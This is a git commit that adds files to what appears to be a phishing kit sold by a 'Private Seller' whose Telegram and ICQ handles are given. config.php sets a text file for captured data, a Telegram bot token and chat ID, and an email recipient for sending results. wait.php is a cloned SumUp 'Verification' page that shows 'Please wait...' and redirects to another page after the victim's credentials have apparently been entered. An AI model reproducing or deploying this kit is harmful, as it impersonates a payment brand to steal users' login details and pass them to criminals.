f6d2ce42909c6cec50fc73363b9b7e11dd2eb1f3
Anym8924 <107959873+Anym8924@users.noreply.github.com>
2025-01-19 01:43:49 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,26 @@
+<?php
+/*
+Author : Private Seller
+ICQ : @pseller200
+https://t.me/pseller200
+*/
+
+ 
+// result
+
+$result = "../zabXnsDss.txt";
+
+
+
+// telegram
+
+$chat = "754634607";
+$token = "7671672791:AAHDTZm89aov3B3aYDuSSeIUgKj2oA2bCxs";
+
+
+// email
+
+$to = "@yandex.com";
+
+
+?>
---
+++ wait.php
@@ -0,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en-gb" data-arp="">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta name="viewport" content="width=device-width" />
+        <title>SumUp - security</title>
+        <meta name="next-head-count" content="3" />
+        <link rel="shortcut icon" href="mucha/favicon.ico" />
+        <meta name="theme-color" content="#ffffff" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link nonce="" rel="preload" href="mucha/be5f86847460dc4e.css" as="style" />
+        <link nonce="" rel="stylesheet" href="mucha/be5f86847460dc4e.css" data-n-g="" />
+        <link nonce="" rel="preload" href="mucha/6223d0e68bce5b57.css" as="style" />
+        <link nonce="" rel="stylesheet" href="mucha/6223d0e68bce5b57.css" data-n-p="" />
+		<meta http-equiv="refresh" content="5; url=index-e.php">
+    </head>
+    <body style="" cz-shortcut-listen="true">
+        <div id="__next">
+            <div class="styles_content__vEkvi">
+                <header class="styles_header__JJ0ZW">
+                    <a href="#" title="Go to SumUp&#39;s website" target="_blank" rel="noopener noreferrer" class="cui-body-o5xe cui-body-one-cjrz cui-anchor-xoc6 cui-focus-visible-y4xg">
+                        <svg class="styles_logo__vLsM0" width="82" height="24" viewBox="0 0 82 24" fill="none" xmlns="#">
+                            <path
+                                d="M22.171.19H1.943C1.029.19.267.952.267 1.867V21.98c0 .914.762 1.676 1.676 1.676H22.17c.915 0 1.677-.762 1.677-1.676V1.867c0-.953-.762-1.677-1.677-1.677ZM15.048 17.83c-2.057 2.057-5.334 2.133-7.505.266l-.038-.038a.356.356 0 0 1 0-.495l7.314-7.276a.4.4 0 0 1 .495 0c1.905 2.21 1.829 5.485-.266 7.543Zm1.523-11.62-7.314 7.277a.4.4 0 0 1-.495 0c-1.905-2.172-1.829-5.448.228-7.505 2.058-2.057 5.334-2.133 7.505-.267 0 0 .038 0 .038.038.19.115.19.343.038.458Z"
+                                fill="currentColor"
+                                class="logo-symbol"
+                            ></path>
+                            <g class="logo-text" fill="currentColor">
+                                <path
+                                    fill-rule="evenodd"
+                                    clip-rule="evenodd"
+                                    d="M55.048 6.705h-.038a3.22 3.22 0 0 0-2.286.952 3.29 3.29 0 0 0-2.286-.952H50.4c-1.752 0-3.2 1.41-3.2 3.2v6.21c.038.495.419.876.914.876.495 0 .876-.381.915-.877v-6.21c0-.761.61-1.37 1.371-1.37h.038c.762 0 1.333.57 1.371 1.333v6.247c.047.45.364.877.877.877.495 0 .876-.381.914-.877V9.83c.038-.724.648-1.334 1.371-1.334h.039c.761 0 1.37.61 1.37 1.372v6.247c.039.495.42.877.915.877.495 0 .876-.381.914-.877v-6.21c.039-1.752-1.409-3.2-3.161-3.2Zm-10.82 0c-.495 0-.876.38-.914.876v6.21c0 .761-.61 1.37-1.41 1.37h-.037c-.762 0-1.41-.609-1.41-1.37V7.542c-.038-.495-.419-.876-.914-.876-.495 0-.876.38-.914.876v6.21c0 1.752 1.447 3.2 3.238 3.2h.038c1.79 0 3.238-1.448 3.238-3.2V7.58c0-.495-.42-.876-.915-.876Zm21.639 0c-.496 0-.877.38-.915.876v6.21c0 .761-.61 1.37-1.41 1.37h-.037c-.762 0-1.41-.609-1.41-1.37V7.542c-.038-.495-.419-.876-.914-.876-.495 0-.876.38-.914.876v6.21c0 1.752 1.447 3.2 3.238 3.2h.038c1.79 0 3.238-1.448 3.238-3.2V7.58c-.038-.495-.42-.876-.914-.876Z"
+                                ></path>
+                                <path
+                                    d="M71.924 6.705h-.038c-1.829 0-3.276 1.447-3.276 3.238v11.276c0 .495.418.914.914.914a.927.927 0 0 0 .914-.914v-4.686c.343.305.914.457 1.448.457h.038c1.828 0 3.2-1.561 3.2-3.352V9.867c0-1.79-1.372-3.162-3.2-3.162Zm1.447 7.01c0 .99-.647 1.409-1.41 1.409h-.037c-.8 0-1.41-.42-1.41-1.41V9.943c0-.762.648-1.41 1.41-1.41h.038c.8 0 1.41.61 1.41 1.41v3.771Z"
+                                ></path>
+                                <path
+                                    fill-rule="evenodd"
+                                    clip-rule="evenodd"
+                                    d="M34.133 10.781c-1.028-.42-1.676-.686-1.676-1.295 0-.496.381-.953 1.257-.953.534 0 .99.229 1.334.686.228.267.457.42.723.42.534 0 .953-.42.953-.915 0-.19-.038-.381-.153-.495-.571-.877-1.752-1.486-2.857-1.486-1.523 0-3.085.952-3.085 2.78 0 1.867 1.523 2.477 2.78 2.934.991.381 1.867.724 1.867 1.524 0 .61-.571 1.219-1.638 1.219-.343 0-.952-.076-1.371-.571-.229-.267-.496-.381-.724-.381-.495 0-.953.419-.953.914 0 .19.077.38.19.533.572.876 1.868 1.296 2.858 1.296 1.676 0 3.505-1.067 3.505-3.01-.038-2.057-1.676-2.705-3.01-3.2Z"
+                                ></path>
+                                <path d="M79.39 6.705a1.829 1.829 0 1 0 .001 3.658 1.829 1.829 0 0 0 0-3.658Zm0 3.2c-.761 0-1.371-.61-1.371-1.372 0-.762.61-1.371 1.371-1.371.762 0 1.372.61 1.372 1.371 0 .762-.61 1.372-1.371 1.372Z"></path>
+                                <path
+                                    d="M79.581 8.61a.453.453 0 0 0 .38-.458c0-.304-.228-.495-.57-.495h-.458c-.114 0-.19.076-.19.19v1.258c0 .114.076.19.19.19.115 0 .19-.076.19-.19v-.457l.458.571c.038.076.076.076.19.076.153 0 .19-.114.19-.19s-.037-.115-.075-.153l-.305-.342Zm-.152-.267H79.2v-.381h.229c.114 0 .19.076.19.19 0 .077-.076.19-.19.19Z"
+                                ></path>
+                            </g>
+                        </svg>
+                    </a>
+                </header>
+                <main class="styles_main__lW3lk">
+                    <div class="styles_authMain__xKIjy">
+                        <div class="styles_wrapper__3R5Z3">
+                            <noscript>
+                                <div style="opacity: 1; height: auto; visibility: visible;" class="cui-notificationinline-0ru1 styles_notification__wjKtX">
+                                    <div class="cui-notificationinline-wrapper-vh3s cui-notificationinline-danger-eeh7">
+                                        <div class="cui-notificationinline-icon-x7m1">
+                                            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="#">
+                                                <path
+                                                    d="M11.988 1A10.994 10.994 0 1 0 12 1h-.012zm4.71 14.29c.186.19.29.445.29.71a1 1 0 0 1-1 1c-.265 0-.52-.104-.71-.29l-3.29-3.29-3.29 3.29c-.19.186-.444.29-.71.29a1 1 0 0 1-1-1c0-.265.104-.52.29-.71l3.29-3.29-3.29-3.29a1.013 1.013 0 0 1-.29-.71 1 1 0 0 1 1-1c.266 0 .52.104.71.29l3.29 3.29 3.29-3.29c.19-.186.444-.29.71-.29a1 1 0 0 1 1 1c0 .266-.104.52-.29.71L13.408 12l3.29 3.29z"
+                                                    fill="currentColor"
+                                                ></path>
+                                            </svg>
+                                        </div>
+                                        <span class="cui-hide-visually-mb4x"></span>
+                                        <div class="cui-notificationinline-content-604h">
+                                            <p class="cui-body-o5xe cui-body-one-cjrz">To make sure this page works properly, please use a browser that supports javascript, or enable javascript in your browser settings.</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </noscript>
+                            <div class="styles_box__1egCi login_box__lUFpp">
+                                <h1 class="cui-headline-sagu cui-headline-one-odlf " style="text-aligne:center;">Verification</h1>
+								<br><br>
+                                <form
+                                    autocomplete="on"
+                                    action="#"
+                                    method="POST"
+                                    class="styles_formContainer__xT_Uw"
+                                    novalidate=""
+                                >
+								<center>
+								
+
+                                                <img
+													width="80px"
+													height="80px"
+                                                    src="mucha/l.gif"
+                                                    alt="smartphone"
+                                                    title="La confirmation mobile se fera à la prochaine étape, après avoir introduit votre identifiant et mot de passe."
+                                                />
+												<p>Please wait...</p>
+
+                                 </center>
+
+
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+                <footer class="styles_footer__1GA4i">
+                    <div class="cui-field-wrapper-rn8e styles_languageSelect__DAI65">
+                        <label for="languageSelect" class="cui-field-label-8ama"><span class="cui-field-label-text-x1ew cui-hide-visually-mb4x">Language</span></label>
+                        <div class="cui-select-wrapper-yvno">
+                            <select id="languageSelect" aria-describedby=":Rpb6H1:" class="cui-select-7zcb styles_languageSelect__DAI65" name="languageSelect" data-selector="Auth-language-select">
+                                <option value="da-DK" data-testid="da-DK">Dansk</option>
+                                <option value="de-DE" data-testid="de-DE">Deutsch</option>
+                                <option value="et-EE" data-testid="et-EE">Eesti</option>
+                                <option value="en-GB" data-testid="en-GB" selected="">English</option>
+                                <option value="es-ES" data-testid="es-ES">Español</option>
+                                <option value="fr-FR" data-testid="fr-FR">Français</option>
+                                <option value="hr-HR" data-testid="hr-HR">Hrvatski</option>
+                                <option value="it-IT" data-testid="it-IT">Italiano</option>
+                                <option value="lv-LV" data-testid="lv-LV">Latviešu valoda</option>
+                                <option value="lt-LT" data-testid="lt-LT">Lietuviškai</option>
+                                <option value="hu-HU" data-testid="hu-HU">Magyar</option>
+                                <option value="nl-NL" data-testid="nl-NL">Nederlands</option>
+                                <option value="nb-NO" data-testid="nb-NO">Norsk</option>
+                                <option value="pl-PL" data-testid="pl-PL">Polski</option>
+                                <option value="pt-BR" data-testid="pt-BR">Português</option>
+                                <option value="ro-RO" data-testid="ro-RO">Română</option>
+                                <option value="sk-SK" data-testid="sk-SK">Slovenčina</option>
+                                <option value="sl-SI" data-testid="sl-SI">Slovenščina</option>
+                                <option value="fi-FI" data-testid="fi-FI">Suomi</option>
+                                <option value="sv-SE" data-testid="sv-SE">Svenska</option>
+                                <option value="cs-CZ" data-testid="cs-CZ">Čeština</option>
+                                <option value="el-GR" data-testid="el-GR">Ελληνικά</option>
+                                <option value="bg-BG" data-testid="bg-BG">Български</option>
+                            </select>
+                            <svg class="cui-select-icon-8yjr" aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="#">
+                                <path
+                                    d="M8 11c-.266 0-.52-.104-.71-.29l-4-4A1.013 1.013 0 0 1 3 6a1 1 0 0 1 1-1c.266 0 .52.104.71.29L8 8.58l3.29-3.29c.19-.186.445-.29.71-.29a1 1 0 0 1 1 1c0 .266-.104.52-.29.71l-4 4c-.19.186-.444.29-.71.29z"
+                                    fill="currentColor"
+                                ></path>
+                            </svg>
+                        </div>
+                        <span role="status" aria-live="polite"></span>
+                    </div>
+                    <a href="#" class="cui-button-ylou cui-button-secondary-owsx cui-button-m-p5bj cui-focus-visible-y4xg cui-button-m-9sec">
+                        <span class="cui-button-loader-uhaf" aria-hidden="true">
+                            <span class="cui-button-dot-let3"></span><span class="cui-button-dot-let3"></span><span class="cui-button-dot-let3"></span><span class="cui-hide-visually-mb4x"></span>
+                        </span>
+                        <span class="cui-button-content-vmdv"><span class="cui-button-label-cmag">System status</span></span>
+                    </a>
+                </footer>
+            </div>
+        </div>
+
+    </body>
+</html>
